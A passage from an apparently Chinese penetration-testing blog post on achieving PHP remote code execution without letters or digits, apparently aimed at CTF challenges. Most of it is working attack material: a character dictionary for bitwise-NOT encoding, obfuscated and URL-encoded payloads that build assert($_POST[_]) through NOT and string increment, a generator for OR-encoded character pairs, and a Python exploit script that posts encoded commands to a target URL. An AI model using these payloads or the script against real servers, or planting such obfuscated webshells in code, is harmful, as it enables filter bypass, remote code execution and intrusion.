class="line">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span><br><span class="line">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span><br><span class="line">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span><br><span class="line">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span><br><span class="line">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span><br><span class="line">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span><br><span class="line">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span><br><span class="line">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span><br><span class="line">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span><br><span class="line">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span><br><span class="line">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span><br><span class="line">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span><br><span class="line">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span><br><span class="line">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span><br><span class="line">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span><br><span class="line">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span><br><span class="line">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span><br><span class="line">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span><br><span class="line">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span><br><span class="line">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span><br><span class="line">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span><br><span class="line">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span><br><span class="line">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span><br><span class="line">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span><br><span class="line">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span><br><span class="line">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span><br><span class="line">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span><br><span class="line">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span><br><span class="line">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;</span><br><span class="line">function mb_str_split( $string ) &#123;</span><br><span class="line">    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); </span><br><span class="line">&#125;</span><br><span class="line">foreach (mb_str_split($word) as $c)</span><br><span class="line">&#123;</span><br><span class="line">    $arr[] = $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($x=0;$x&lt;strlen($shell);$x++)</span><br><span class="line">&#123;</span><br><span class="line">    for ($y=0;$y&lt;count($arr);$y++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = $arr[$y];</span><br><span class="line">        if ($shell[$x] == ~($k&#123;1&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            $result .= $k;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $result;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$_++;                //得到1，此时$_=1</span><br><span class="line">$__ = &quot;极&quot;;</span><br><span class="line">$___ = ~($__&#123;$_&#125;);   //得到a，此时$___=&quot;a&quot;</span><br><span class="line">$__ = &quot;区&quot;;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;);   //得到s，此时$___=&quot;as&quot;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;);   //此时$___=&quot;ass&quot;</span><br><span class="line">$__ = &quot;皮&quot;;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;);   //得到e，此时$___=&quot;asse&quot;</span><br><span class="line">$__ = &quot;十&quot;;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;);   //得到r，此时$___=&quot;asser&quot;</span><br><span class="line">$__ = &quot;勺&quot;;</span><br><span class="line">$___ .= ~($__&#123;$_&#125;);   //得到t，此时$___=&quot;assert&quot;</span><br><span class="line">$____ = &#x27;_&#x27;;          //$____=&#x27;_&#x27;</span><br><span class="line">$__ = &quot;寸&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;);   //得到P，此时$____=&quot;_P&quot;</span><br><span class="line">$__ = &quot;小&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;);   //得到O，此时$____=&quot;_PO&quot;</span><br><span class="line">$__ = &quot;欠&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;);   //得到S，此时$____=&quot;_POS&quot;</span><br><span class="line">$__ = &quot;立&quot;;</span><br><span class="line">$____ .= ~($__&#123;$_&#125;);   //得到T，此时$____=&quot;_POST&quot;</span><br><span class="line">$_ = $$____;           //$_ = $_POST</span><br><span class="line">$___($_[_]);           //assert($_POST[_])</span><br><span class="line">放到一排就是：</span><br><span class="line">$_++;$__ = &quot;极&quot;;$___ = ~($__&#123;$_&#125;);$__ = &quot;区&quot;;$___ .= ~($__&#123;$_&#125;);$___ .= ~($__&#123;$_&#125;);$__ = &quot;皮&quot;;$___ .= ~($__&#123;$_&#125;);$__ = &quot;十&quot;;$___ .= ~($__&#123;$_&#125;);$__ = &quot;勺&quot;;$___ .= ~($__&#123;$_&#125;);$____ = &#x27;_&#x27;;$__ = &quot;寸&quot;;$____ .= ~($__&#123;$_&#125;);$__ = &quot;小&quot;;$____ .= ~($__&#123;$_&#125;);$__ = &quot;欠&quot;;$____ .= ~($__&#123;$_&#125;);$__ = &quot;立&quot;;$____ .= ~($__&#123;$_&#125;);$_ = $$____;$___($_[_]);</span><br></pre></td></tr></table></figure>
+<h1 id="三自增">三、自增 <code>++</code></h1>
+<blockquote>
+<p>[!Important]</p>
+<p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = 'Z'; a++;</code>
+将把 <code>a</code> 变成 <code>'['</code>（<code>'Z'</code> 的 ASCII
+值是 90，<code>'['</code> 的 ASCII 值是 91），而在Perl中，
+<code>$a = 'Z'; $a++;</code> 将把 <code>$a</code>
+变成<code>'AA'</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z
+和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p>
+<p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
+<p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
+</blockquote>
+<p>目标payload<code>assert($_POST[_])</code></p>
+<p>构造过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
+<p>url编码结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
+<h1 id="四或">四、或<code>|</code></h1>
+<p>或运算字符集生成脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">	for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">		if($i&lt;16)&#123;</span><br><span class="line">			$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_i=dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		if($j&lt;16)&#123;</span><br><span class="line">			$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_j=dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		$preg = &#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;;</span><br><span class="line">		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">					echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		else&#123;</span><br><span class="line">		$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">		$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">		$c=(urldecode($a)|urldecode($b));</span><br><span class="line">		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">			$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>自动化python脚本传参exp.py</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">   </span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://auranlu.cc">Auran_Lu</a>
+            <p>原文链接：<a href="https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</a>
+            <p>发表日期：<a href="https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">March 9th 2025, 4:00:00 pm</a>
